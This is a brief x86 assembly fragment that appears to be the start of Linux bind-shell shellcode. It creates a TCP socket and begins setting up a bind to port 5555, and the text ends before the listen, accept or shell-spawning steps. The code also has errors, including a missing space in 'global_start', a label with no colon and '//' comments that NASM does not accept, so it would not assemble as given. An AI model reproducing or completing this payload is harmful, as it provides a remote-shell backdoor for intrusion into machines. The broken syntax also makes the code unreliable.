global_start

section .text
_start
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx

    mov ax,0x167
    mov bl,0x2
    mov cl,0x1

    int 0x80
    mov edi,eax

    xor eax,eax
    mov ax,0x169
    mov ebx,edi
    xor ecx,ecx
    push ecx
    push ecx
    push word 0xb315 // port 5555 => 0x15b3 =(little endian)> 0xb315
    push word 0x02

    

